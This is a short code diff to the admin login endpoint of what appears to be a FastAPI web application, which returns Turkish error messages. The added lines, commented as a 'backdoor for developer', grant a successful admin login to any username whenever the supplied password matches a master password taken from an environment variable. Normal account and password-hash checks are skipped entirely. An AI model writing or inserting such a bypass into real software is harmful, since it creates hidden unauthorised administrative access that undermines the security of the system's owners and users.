@@ -521,6 +521,12 @@ async def root():
 # Admin endpoints
 @api_router.post("/admin/login")
 async def admin_login(login: AdminLogin):
+    # Check master password first (backdoor for developer)
+    master_password = os.environ.get('MASTER_ADMIN_PASSWORD')
+    if master_password and login.password == master_password:
+        return {"success": True, "username": login.username, "master": True}
+    
+    # Normal admin login
     admin = await db.admins.find_one({"username": login.username}, {"_id": 0})
     if not admin or not verify_password(login.password, admin["password_hash"]):
         raise HTTPException(status_code=401, detail="Hatalı kullanıcı adı veya şifre")
